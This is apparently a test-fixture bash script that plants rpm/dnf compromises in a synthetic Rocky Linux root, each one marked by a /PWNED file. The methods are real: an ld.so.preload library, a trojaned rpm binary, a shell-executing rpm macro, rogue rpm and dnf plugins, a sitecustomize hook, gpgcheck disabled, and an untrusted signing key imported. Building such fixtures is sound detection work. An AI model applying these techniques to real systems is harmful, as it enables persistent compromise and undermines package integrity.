#!/bin/bash
# Plant rpm/dnf attacks in a synthetic Rocky test root (each touches /PWNED_<name>).
# TEST USE ONLY. Usage: plant_rpm.sh TARGET_ROOT
set -euo pipefail
T=$1; B=/srv/t/rocky
cd "$T"
ML=usr/lib/x86_64-linux-gnu
# rpmdb tampering: same NEVRA, malicious scriptlets/triggers (installed without running anything)
# done first: it rewrites the package files
rpm --root "$T" --dbpath /var/lib/rpm -U --replacepkgs --replacefiles --nosignature --noscripts --notriggers \
    $B/evil/rpm-4.16.1.3-29.el9.x86_64.rpm $B/evil/systemd-ft-252-32.el9.x86_64.rpm 2>/dev/null
mk_so() {  # mk_so OUTPUT MARKER
    printf '#include <fcntl.h>\n#include <unistd.h>\n__attribute__((constructor)) static void p(void){int f=open("/PWNED_%s",O_CREAT|O_WRONLY,0644);if(f>=0)close(f);}\n' "$2" > /tmp/m.c
    gcc -shared -fPIC -o "$1" /tmp/m.c
}
mk_so $ML/libevil.so preload
echo /$ML/libevil.so > etc/ld.so.preload
# trojaned rpm
mv usr/bin/rpm usr/bin/.rpm.real
printf '#!/bin/sh\n/usr/bin/touch /PWNED_rpm\nexec /usr/bin/.rpm.real "$@"\n' > usr/bin/rpm; chmod 755 usr/bin/rpm
# macro evaluated by every rpm run that uses the default dbpath
mkdir -p etc/rpm
echo '%_dbpath %(/usr/bin/touch /PWNED_macro; echo /var/lib/rpm)' > etc/rpm/macros.zzevil
# transaction plugin
mkdir -p usr/lib64/rpm-plugins; mk_so usr/lib64/rpm-plugins/evil.so plugin
echo '%__transaction_evil %{__plugindir}/evil.so' > usr/lib/rpm/macros.d/macros.transaction_evil
# Python start-up hook and a rogue dnf plugin
echo 'open("/PWNED_sitecustomize","w")' > usr/lib64/python3.9/site-packages/sitecustomize.py
echo 'open("/PWNED_dnfplugin","w")' > usr/lib64/python3.9/site-packages/dnf-plugins/evil.py
# signature checks disabled in the shipped repo file
sed -i 's/^gpgcheck=1/gpgcheck=0/' etc/yum.repos.d/rocky.repo
# extra trusted key in the rpmdb
rpm --root "$T" --dbpath /var/lib/rpm --import $B/evilkey.asc
# same-size byte flip in an rpm library
python3 - "$(ls $T/$ML/librpmio.so.* | grep -v '\.so\.[0-9]*$' | head -1)" <<'EOF'
import sys; p = sys.argv[1]; b = bytearray(open(p, "rb").read()); b[-200] ^= 0xFF; open(p, "wb").write(bytes(b))
EOF
echo planted
